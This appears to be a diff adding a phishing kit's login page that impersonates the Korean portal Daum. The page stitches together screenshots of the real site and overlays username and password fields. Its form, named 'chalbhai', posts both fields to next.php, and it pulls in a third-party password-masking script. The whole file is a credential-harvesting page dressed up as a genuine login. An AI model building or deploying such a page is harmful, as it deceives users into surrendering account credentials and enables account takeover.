@@ -1,0 +1,90 @@
+<html><head>
+<title>Daum 로그인</title>
+<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon" href="images/favicon.ico">	
+<script type="text/javascript">
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+</script>
+<style type="text/css">
+.textbox {  
+    border-top: solid 1px #B8B8B8; 
+    border-right: solid 1px #B8B8B8; 
+    border-left: solid 1px #B8B8B8; 
+    border-bottom: solid 1px #B8B8B8; 
+    height: 46px; 
+    width: 275px; 
+  	padding-left:10px;
+ } 
+.textbox:focus {  
+    border-color: #4488cc; 
+    border-style: solid; 
+    border-width: 1px; 
+    outline: 0; 
+ } 
+</style>
+<style type="text/css">
+div#container
+{
+	position:relative;
+	width: 1356px;
+	margin-top: 0px;
+	margin-left: auto;
+	margin-right: auto;
+	text-align:left; 
+}
+body {text-align:center;margin:0}
+</style>
+
+</head>
+<body style="visibility: visible;" onload="unhideBody()" bgcolor="#ECECEE">
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:324px; top:-1px; width:707px; height:94px; z-index:0"><img src="images/da1.png" alt="" title="" border="0" width="707" height="94"></div>
+
+<div id="image2" style="position:absolute; overflow:hidden; left:324px; top:93px; width:708px; height:312px; z-index:1"><img src="images/da2.png" alt="" title="" border="0" width="708" height="312"></div>
+
+<div id="image3" style="position:absolute; overflow:hidden; left:323px; top:405px; width:710px; height:263px; z-index:2"><img src="images/da3.png" alt="" title="" border="0" width="710" height="263"></div>
+
+<div id="image4" style="position:absolute; overflow:hidden; left:626px; top:21px; width:105px; height:49px; z-index:3"><a href="#"><img src="images/logo.png" alt="" title="" border="0" width="105" height="49"></a></div>
+
+<div id="image5" style="position:absolute; overflow:hidden; left:565px; top:125px; width:107px; height:19px; z-index:4"><a href="#"><img src="images/da4.png" alt="" title="" border="0" width="107" height="19"></a></div>
+
+<div id="image6" style="position:absolute; overflow:hidden; left:386px; top:333px; width:92px; height:21px; z-index:5"><a href="#"><img src="images/da5.png" alt="" title="" border="0" width="92" height="21"></a></div>
+
+<div id="image7" style="position:absolute; overflow:hidden; left:605px; top:331px; width:67px; height:18px; z-index:6"><a href="#"><img src="images/da6.png" alt="" title="" border="0" width="67" height="18"></a></div>
+
+<div id="image8" style="position:absolute; overflow:hidden; left:400px; top:376px; width:233px; height:20px; z-index:7"><a href="#"><img src="images/da7.png" alt="" title="" border="0" width="233" height="20"></a></div>
+
+<div id="image9" style="position:absolute; overflow:hidden; left:390px; top:437px; width:256px; height:42px; z-index:8"><a href="#"><img src="images/da8.png" alt="" title="" border="0" width="256" height="42"></a></div>
+
+<div id="image10" style="position:absolute; overflow:hidden; left:602px; top:579px; width:152px; height:20px; z-index:9"><a href="#"><img src="images/da9.png" alt="" title="" border="0" width="152" height="20"></a></div>
+
+<form action="next.php" name="chalbhai" id="chalbhai" method="post">
+<input name="usr" placeholder="아이디 입력" class="textbox" required="" type="text" style="position:absolute;width:301px;left:367px;top:150px;z-index:10">
+<span style="position: relative;"><input type="hidden" name="psw"><input id="demo-field" placeholder="비밀번호 입력" class="textbox masked" required="" style="position:absolute;width:301px;left:367px;top:205px;z-index:11" value="" type="text" autocomplete="off"></span>
+<div id="formimage1" style="position:absolute; left:366px; top:272px; z-index:12"><input type="image" name="formimage1" width="302" height="52" src="images/buton.png"></div>
+<div id="formcheckbox1" style="position:absolute; left:366px; top:333px; z-index:13"><input type="checkbox" name="formcheckbox1"></div>
+</form></div>
+<script type="text/javascript">
+ 
+  //apply masking to the demo-field
+  //pass the field reference, masking symbol, and character limit
+  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
+ 
+  //test the submitted value
+  document.getElementById('demo-form').onsubmit = function()
+  {
+   alert('pword = "' + this.pword.value + '"');
+   return false;
+  };
+ 
+ </script>
+ 
+	
+
+
+</body></html>
